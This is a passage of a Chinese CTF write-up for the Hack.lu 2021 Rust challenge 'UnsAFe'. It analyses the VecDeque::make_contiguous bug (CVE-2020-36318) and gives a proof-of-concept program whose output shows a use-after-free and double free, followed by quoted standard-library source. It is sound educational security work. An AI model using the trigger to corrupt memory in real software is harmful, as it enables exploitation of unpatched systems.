# Hack.lu CTF 2021 Writeup by r3kapig
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言:
本次比赛我们获得了第五名的成绩
现将师傅们的 wp 整理如下，分享给大家一起学习进步~ 同时也欢迎各位大佬加入 r3kapig 的大家庭，大家一起学习进步，相互分享~
简历请投战队邮箱：[PI:EMAIL](mailto:PI:EMAIL)
## Pwn:
###  UnsAFe(Mid):
可能写得有些啰嗦 但是算是完整记录了这个题目 师傅们凑合看看
####  简述：
这道题的考察点就是 [Rust CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36318) \+ 堆风水操控。其中 Rust 标准库中 `VecDeque`
的漏洞比较有意思，下面也会重点讲该漏洞的成因和利用方法
####  功能：
程序开头先初始化了几个变量，这些变量接下来也会用到。
下面是它们的类型（有调试信息可以直接找到）：
    self.pws: HashMap 
    highlighted_tast.q: Box>;
    task_queue.q:VecDeque>>
分析结果:
0 功能是向 `PasswordManager` 的 hashmap 中添加一个 key-value
1 功能是通过输入 key，来在 hashmap 中查找 value
2 功能是修改键值对，但是如果 insert 时的 str 长度 > 需要替换的 str，则会插入，否则会替换
3 输入 task 数量，然后对每个 task 要输入 elem （String）数量，对每个 String 要输入长度和内容，最后 `push_back`
到 `TaskDeque` 中
4 功能是用 `pop_front` 从 3 中 `TaskQueue` 取一个 `Vec q`，然后
`highlighted_task->q = q`
5 功能是修改 `highlighted_task` 中的 vec，给定需要修改的 idx 和新内容进行修改 ，会存在和 2 功能一样的问题
6 功能是通过输入 idx 获取 highlighted_task 中的 value
7 功能是向 highlighted_task 添加（push）一个 value
####  漏洞：
找到了一个漏洞：[VecDeque: length 0 underflow and bogus values from pop_front(),
triggered by a certain sequence of reserve(), push_back(), make_contiguous(),
pop_front()](https://github.com/rust-lang/rust/issues/79808)，存在于 1.48.0 版本的
`VecDeque::make_contiguous` 函数中。
查找字符串可以找到编译器的版本:
在 `unsafe::TaskQueue::push_back::haa04777951b4543a` 函数中也调用了 `make_contiguous`
对上了！下面就来研究一下这个漏洞。
安装 rust 1.48 及其源码：
    $ rustup install 1.48
    $ rustup +1.48 component add rust-src
找到对应 patch：[fix soundness issue in `make_contiguous`
#79814](https://github.com/rust-lang/rust/pull/79814/files)
####  VecDeque 的内部表示：
结构体：
  * .rustup/toolchains/1.48-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/alloc/src/collections/vec_deque.rs
        pub struct VecDeque {
            // tail and head are pointers into the buffer. Tail always points
            // to the first element that could be read, Head always points
            // to where data should be written.
            // If tail == head the buffer is empty. The length of the ringbuffer
            // is defined as the distance between the two.
            tail: usize,
            head: usize,
            buf: RawVec,
        }
这里借用 **[Analysis of CVE-2018-1000657: OOB write in Rust’s
VecDeque::reserve()](https://gts3.org/2019/cve-2018-1000657.html)** 中的图示：
poc:
修改 `VecDeque` 为 `VecDeque`：
  * poc.rs 
        use std::collections::VecDeque;
    fn ab(dq: &mut VecDeque, sz: usize) {
        for i in 0..sz {
            let string = (i).to_string();
            dq.push_back(string);
        }
        dq.make_contiguous();
        for _ in 0..sz {
            dq.pop_front();
        }
    }
    fn ab_1(dq: &mut VecDeque, sz: usize) {
        for i in 0..sz {
            let string = (i).to_string();
            dq.push_back(string);
        }
        for _ in 0..sz {
            dq.pop_front();
        }
    }
    // let free = self.tail - self.head;
    // let tail_len = cap - self.tail;
    fn main() {
        let mut dq = VecDeque::new(); // 默认capacity为7
        ab_1(&mut dq, 2);
        ab(&mut dq, 7);
        dbg!(dq.len()); // this is zero
        dbg!(dq.pop_front()); // uaf+double frees
    }
编译并运行：
    $ rustc poc.rs
    $ ./poc 
    [poc.rs:32] dq.len() = 0
    [poc.rs:34] dq.pop_front() = Some(
        "@",
    )
    free(): double free detected in tcache 2
    Aborted
发生了 double free
patch:
漏洞的成因：
####  VecDeque\::make_contiguous:
`make_contiguous` 的作用是使 `VecDeque` 的元素变得连续，这样就可以调用 `as_slice` 等方法获得 `VecDeque`
的切片。
接下来结合源码、POC 和 Patch 画图分析：
首先创建 capacity 为 3 的 VecDeque：`let mut dq = VecDeque::with_capacity(3);`
然后 `dq.push_back(val);` 两次，`dq.pop_front();` 两次：
然后再依次 `push_back` a、b、c：
此时调用 `dq.make_contiguous();`：
此时 `self.tail == 2, self.head == 1, free == 1, tail_len == , len == 3`
执行流程会走入 `else if free >= self.head`
  * `make_contiguous`
        #[stable(feature = "deque_make_contiguous", since = "1.48.0")]
        pub fn make_contiguous(&mut self) -> &mut [T] {
            if self.is_contiguous() {
                let tail = self.tail;
                let head = self.head;
                return unsafe { &mut self.buffer_as_mut_slice()[tail..head] };
            }
            let buf = self.buf.ptr();
            let cap = self.cap();
            let len = self.len();
            let free = self.tail - self.head;
            let tail_len = cap - self.tail;
            if free >= tail_len {
                // there is enough free space to copy the tail in one go,
                // this means that we first shift the head backwards, and then
                // copy the tail to the correct position.
                //
                // from: DEFGH....ABC
                // to:   ABCDEFGH....
                unsafe {
                    ptr::copy(buf, buf.add(tail_len), self.head);
                    // ...DEFGH.ABC
                    ptr::copy_nonoverlapping(buf.add(self.tail), buf, tail_len);
                    // ABCDEFGH....
                    self.tail = 0;
                    self.head = len;
                }
            } else if free >= self.head {
                // there is enough free space to copy the head in one go,
                // this means that we first shift the tail forwards, and then
                // copy the head to the correct position.
                //
                // from: FGH....ABCDE
                // to:   ...ABCDEFGH.
                unsafe {
                    ptr::copy(buf.add(self.tail), buf.add(self.head), tail_len);
                    // FGHABCDE....
                    ptr::copy_nonoverlapping(buf, buf.add(self.head + tail_len), self.head);
                    // ...ABCDEFGH.
                    self.tail = self.head;
                    self.head = self.tail + len;
                }
            } else {
                // free is smaller than both head and tail,
                // this means we have to slowly "swap" the tail and the head.
                //
                // from: EFGHI...ABCD or HIJK.ABCDEFG
                // to:   ABCDEFGHI... or ABCDEFGHIJK.
                let mut left_edge: usize = 0;
                let mut right_edge: usize = self.tail;
                unsafe {